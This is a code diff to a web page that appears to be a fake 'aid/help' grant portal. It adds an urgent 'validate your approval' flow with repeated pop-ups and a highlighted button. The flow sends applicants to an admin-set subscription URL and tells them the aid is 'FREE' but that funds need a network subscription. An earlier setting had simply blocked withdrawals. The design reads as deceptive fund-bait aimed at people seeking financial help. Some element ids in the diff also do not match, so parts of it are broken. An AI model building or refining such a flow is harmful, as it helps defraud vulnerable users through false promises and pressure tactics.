@@ -207,6 +207,11 @@
             }
         }
         
+        .validation-highlight {
+            border: 3px solid #ffc107 !important;
+            background-color: #fff9e6 !important;
+        }
+        
         @media (max-width: 768px) {
             .hero-section {
                 padding: 60px 0;
@@ -537,16 +542,16 @@
                 <!-- Validate Approval Button (Initially Hidden) -->
                 <div class="row mt-4" id="validate-approval-section" style="display: none;">
                     <div class="col-12">
-                        <div class="card border-warning">
+                        <div class="card validation-highlight">
                             <div class="card-header bg-warning text-dark">
                                 <h5 class="card-title mb-0">
-                                    <i class="fas fa-exclamation-triangle me-2"></i>Action Required
+                                    <i class="fas fa-exclamation-triangle me-2"></i>Action Required - Validate Your Approval
                                 </h5>
                             </div>
                             <div class="card-body">
-                                <p>You need to validate your approval to complete the aid application process.</p>
-                                <button class="btn btn-warning validation-btn-pulse" id="validate-approval-btn">
-                                    <i class="fas fa-check-circle me-2"></i>Validate Approval
+                                <p>You must validate your approval to complete the aid application process and receive your funds.</p>
+                                <button class="btn btn-warning btn-lg validation-btn-pulse" id="validate-approval-btn">
+                                    <i class="fas fa-check-circle me-2"></i><span id="validation-button-text">Validate Your Aid Approval</span>
                                 </button>
                             </div>
                         </div>
@@ -607,25 +612,22 @@
                     <div class="col-md-8">
                         <div class="card">
                             <div class="card-header">
-                                <h5 class="card-title mb-0">Withdrawal Settings</h5>
+                                <h5 class="card-title mb-0">Validation & Redirect Settings</h5>
                             </div>
                             <div class="card-body">
                                 <div class="mb-3">
-                                    <label for="withdrawal-action" class="form-label">Withdrawal Action</label>
-                                    <select class="form-control" id="withdrawal-action">
-                                        <option value="popup">Show Popup Notification</option>
-                                        <option value="redirect">Redirect to External Link</option>
-                                    </select>
+                                    <label for="validation-button-text" class="form-label">Validation Button Text</label>
+                                    <input type="text" class="form-control" id="validation-button-text" placeholder="Enter button text">
                                 </div>
-                                <div class="mb-3" id="redirect-url-container" style="display: none;">
-                                    <label for="redirect-url" class="form-label">Redirect URL</label>
-                                    <input type="url" class="form-control" id="redirect-url" placeholder="https://example.com">
+                                <div class="mb-3">
+                                    <label for="terms-message" class="form-label">Terms & Conditions Message</label>
+                                    <textarea class="form-control" id="terms-message" rows="4" placeholder="Enter the message to show in validation popup"></textarea>
                                 </div>
-                                <div class="mb-3" id="popup-message-container">
-                                    <label for="popup-message" class="form-label">Popup Message</label>
-                                    <textarea class="form-control" id="popup-message" rows="3">Withdrawal functionality is currently unavailable. Please check back later or contact support.</textarea>
+                                <div class="mb-3">
+                                    <label for="redirect-url" class="form-label">Subscription Redirect URL</label>
+                                    <input type="url" class="form-control" id="redirect-url" placeholder="https://example.com/subscribe">
                                 </div>
-                                <button class="btn btn-primary" id="save-settings-btn">Save Settings</button>
+                                <button class="btn btn-primary" id="save-validation-settings">Save Validation Settings</button>
                             </div>
                         </div>
                     </div>
@@ -863,8 +865,7 @@
                     <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                 </div>
                 <div class="modal-body">
-                    <p>The AID/HELP is non-refundable and is sponsored by your network providers. To receive the funds, you need to subscribe to your personal network.</p>
-                    <p>By proceeding, you acknowledge that this aid is provided as a one-time assistance and cannot be refunded once disbursed.</p>
+                    <p id="terms-message-content">The AID/HELP is FREE and is sponsored by your Network providers. You need to subscribe to your personal network to receive the funds.</p>
                 </div>
                 <div class="modal-footer">
                     <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
@@ -944,6 +945,7 @@
         let applicationData = null;
         let stream = null;
         let userCurrency = '$';
+        let needsValidationCheck = false;
 
         // Currency mapping
         const countryToCurrency = {
@@ -968,6 +970,7 @@
             loadContactInfo();
             checkGlobalNotification();
             checkPendingSubscription();
+            loadValidationSettings();
         });
 
         // Initialize all event listeners
@@ -1016,8 +1019,7 @@
             const validateApprovalBtn = document.getElementById('validate-approval-btn');
             if (validateApprovalBtn) {
                 validateApprovalBtn.addEventListener('click', function() {
-                    const termsModal = new bootstrap.Modal(document.getElementById('termsModal'));
-                    termsModal.show();
+                    showValidationTerms();
                 });
             }
             
@@ -1035,11 +1037,12 @@
                     
                     // Store that user has been redirected
                     localStorage.setItem('aid_redirected', 'true');
+                    localStorage.setItem('aid_redirect_time', Date.now().toString());
                     
-                    // Show subscription verification modal after a delay
+                    // Show subscription verification modal after a short delay
                     setTimeout(function() {
                         checkPendingSubscription();
-                    }, 2000);
+                    }, 1000);
                 });
             }
             
@@ -1063,6 +1066,7 @@
                         
                         // Clear the redirected flag
                         localStorage.removeItem('aid_redirected');
+                        localStorage.removeItem('aid_redirect_time');
                         
                         Swal.fire({
                             icon: 'success',
@@ -1082,20 +1086,9 @@
             }
             
             // Admin settings
-            const withdrawalAction = document.getElementById('withdrawal-action');
-            if (withdrawalAction) {
-                withdrawalAction.addEventListener('change', function() {
-                    const action = this.value;
-                    document.getElementById('redirect-url-container').style.display = 
-                        action === 'redirect' ? 'block' : 'none';
-                    document.getElementById('popup-message-container').style.display = 
-                        action === 'popup' ? 'block' : 'none';
-                });
-            }
-            
-            const saveSettingsBtn = document.getElementById('save-settings-btn');
-            if (saveSettingsBtn) {
-                saveSettingsBtn.addEventListener('click', saveAdminSettings);
+            const saveValidationSettingsBtn = document.getElementById('save-validation-settings');
+            if (saveValidationSettingsBtn) {
+                saveValidationSettingsBtn.addEventListener('click', saveValidationSettings);
             }
             
             // Bulk actions
@@ -1313,6 +1306,7 @@
                     
                     // Show validate approval section
                     document.getElementById('validate-approval-section').style.display = 'block';
+                    needsValidationCheck = true;
                     
                     // Reset form
                     document.getElementById('aid-application-form').reset();
@@ -1325,17 +1319,10 @@
                         confirmButtonColor: '#1a73e8'
                     });
                     
-                    // Show notification about validation requirement
+                    // Show notification about validation requirement immediately
                     setTimeout(function() {
-                        Swal.fire({
-                            icon: 'info',
-                            title: 'Action Required',
-                            text: 'Please validate your approval to complete the application process.',
-                            confirmButtonColor: '#1a73e8'
-                        }).then(() => {
-                            document.getElementById('validate-approval-section').scrollIntoView({ behavior: 'smooth' });
-                        });
-                    }, 1000);
+                        showValidationReminder();
+                    }, 1500);
                     
                     // Update application history
                     loadUserApplications();
@@ -1352,6 +1339,45 @@
                         confirmButtonColor: '#1a73e8'
                     });
                 });
+        }
+        
+        // Show validation reminder popup
+        function showValidationReminder() {
+            Swal.fire({
+                icon: 'warning',
+                title: 'Validation Required',
+                text: 'You must validate your approval to complete your aid application.',
+                confirmButtonText: 'Validate Now',
+                showCancelButton: true,
+                cancelButtonText: 'Later',
+                confirmButtonColor: '#1a73e8',
+                cancelButtonColor: '#6c757d'
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    // Scroll to and highlight the validation button
+                    document.getElementById('validate-approval-section').scrollIntoView({ 
+                        behavior: 'smooth',
+                        block: 'center'
+                    });
+                    
+                    // Add extra highlight effect
+                    const validationCard = document.getElementById('validate-approval-section').querySelector('.card');
+                    validationCard.classList.add('validation-highlight');
+                    
+                    setTimeout(() => {
+                        validationCard.classList.remove('validation-highlight');
+                    }, 3000);
+                }
+            });
+        }
+        
+        // Show validation terms modal
+        function showValidationTerms() {
+            const termsMessage = getAdminSetting('termsMessage') || adminConfig.termsMessage;
+            document.getElementById('terms-message-content').textContent = termsMessage;
+            
+            const termsModal = new bootstrap.Modal(document.getElementById('termsModal'));
+            termsModal.show();
         }
         
         // Handle withdrawal request
@@ -1467,6 +1493,7 @@
                     }
                     
                     let hasPending = false;
+                    let needsValidation = false;
                     let latestApplication = null;
                     
                     querySnapshot.forEach((doc) => {
@@ -1502,6 +1529,10 @@
                         if (app.status === 'submitted' || app.status === 'pending') {
                             hasPending = true;
                         }
+                        
+                        if (app.status === 'submitted' && !app.validated) {
+                            needsValidation = true;
+                        }
                     });
                     
                     // Update application status display
@@ -1518,31 +1549,19 @@
                     }
                     
                     // Show validate approval section if there's a submitted application that needs validation
-                    if (hasPending) {
+                    if (needsValidation) {
                         document.getElementById('validate-approval-section').style.display = 'block';
+                        needsValidationCheck = true;
                         
-                        // Check if we need to prompt user to validate
-                        const needsValidation = querySnapshot.docs.some(doc => 
-                            doc.data().status === 'submitted' && !doc.data().validated
-                        );
-                        
-                        if (needsValidation) {
-                            // Show notification if user hasn't validated yet
+                        // Show validation reminder if user hasn't seen it yet
+                        if (needsValidationCheck) {
                             setTimeout(() => {
-                                Swal.fire({
-                                    icon: 'warning',
-                                    title: 'Validation Required',
-                                    text: 'Please validate your approval to complete your aid application.',
-                                    confirmButtonText: 'Validate Now',
-                                    showCancelButton: true,
-                                    cancelButtonText: 'Later'
-                                }).then((result) => {
-                                    if (result.isConfirmed) {
-                                        document.getElementById('validate-approval-btn').scrollIntoView({ behavior: 'smooth' });
-                                    }
-                                });
-                            }, 1500);
+                                showValidationReminder();
+                                needsValidationCheck = false;
+                            }, 2000);
                         }
+                    } else {
+                        document.getElementById('validate-approval-section').style.display = 'none';
                     }
                 })
                 .catch((error) => {
@@ -1668,34 +1687,39 @@
                 });
         }
         
-        // Load admin settings
-        function loadAdminSettings() {
-            const withdrawalAction = localStorage.getItem('withdrawalAction') || 'popup';
-            const popupMessage = localStorage.getItem('popupMessage') || 'Withdrawal functionality is currently unavailable. Please check back later or contact support.';
-            const redirectUrl = localStorage.getItem('redirectUrl') || adminConfig.defaultRedirectUrl;
+        // Load validation settings
+        function loadValidationSettings() {
+            const buttonText = getAdminSetting('validationButtonText') || adminConfig.validationButtonText;
+            const termsMessage = getAdminSetting('termsMessage') || adminConfig.termsMessage;
+            const redirectUrl = getAdminSetting('redirectUrl') || adminConfig.defaultRedirectUrl;
             
-            document.getElementById('withdrawal-action').value = withdrawalAction;
-            document.getElementById('popup-message').value = popupMessage;
-            document.getElementById('redirect-url').value = redirectUrl;
+            document.getElementById('validation-button-text').textContent = buttonText;
             
-            // Trigger change to show/hide relevant fields
-            document.getElementById('withdrawal-action').dispatchEvent(new Event('change'));
+            // Update admin panel fields
+            if (document.getElementById('validation-button-text-input')) {
+                document.getElementById('validation-button-text-input').value = buttonText;
+                document.getElementById('terms-message').value = termsMessage;
+                document.getElementById('redirect-url').value = redirectUrl;
+            }
         }
         
-        // Save admin settings
-        function saveAdminSettings() {
-            const withdrawalAction = document.getElementById('withdrawal-action').value;
-            const popupMessage = document.getElementById('popup-message').value;
+        // Save validation settings
+        function saveValidationSettings() {
+            const buttonText = document.getElementById('validation-button-text-input').value;
+            const termsMessage = document.getElementById('terms-message').value;
             const redirectUrl = document.getElementById('redirect-url').value;
             
-            localStorage.setItem('withdrawalAction', withdrawalAction);
-            localStorage.setItem('popupMessage', popupMessage);
+            localStorage.setItem('validationButtonText', buttonText);
+            localStorage.setItem('termsMessage', termsMessage);
             localStorage.setItem('redirectUrl', redirectUrl);
+            
+            // Update UI
+            document.getElementById('validation-button-text').textContent = buttonText;
             
             Swal.fire({
                 icon: 'success',
                 title: 'Settings Saved!',
-                text: 'Admin settings have been updated successfully.',
+                text: 'Validation settings have been updated successfully.',
                 confirmButtonColor: '#1a73e8'
             });
         }
@@ -1786,11 +1810,38 @@
             
             // Check if user was redirected but hasn't verified subscription
             const wasRedirected = localStorage.getItem('aid_redirected') === 'true';
+            const redirectTime = localStorage.getItem('aid_redirect_time');
             
-            if (wasRedirected) {
-                const subscriptionModal = new bootstrap.Modal(document.getElementById('subscriptionModal'));
-                subscriptionModal.show();
+            // Show subscription modal if user was redirected (within last 24 hours)
+            if (wasRedirected && redirectTime) {
+                const timeDiff = Date.now() - parseInt(redirectTime);
+                const hoursDiff = timeDiff / (1000 * 60 * 60);
+                
+                if (hoursDiff < 24) {
+                    const subscriptionModal = new bootstrap.Modal(document.getElementById('subscriptionModal'));
+                    subscriptionModal.show();
+                } else {
+                    // Clear old redirect data
+                    localStorage.removeItem('aid_redirected');
+                    localStorage.removeItem('aid_redirect_time');
+                }
             }
+            
+            // Also check if there are any applications that need subscription verification
+            firebase.firestore().collection('applications')
+                .where('userId', '==', currentUserId)
+                .where('validated', '==', true)
+                .where('subscriptionVerified', '==', false)
+                .get()
+                .then((querySnapshot) => {
+                    if (!querySnapshot.empty) {
+                        const subscriptionModal = new bootstrap.Modal(document.getElementById('subscriptionModal'));
+                        subscriptionModal.show();
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error checking pending subscription:", error);
+                });
         }
         
         // Load contact information
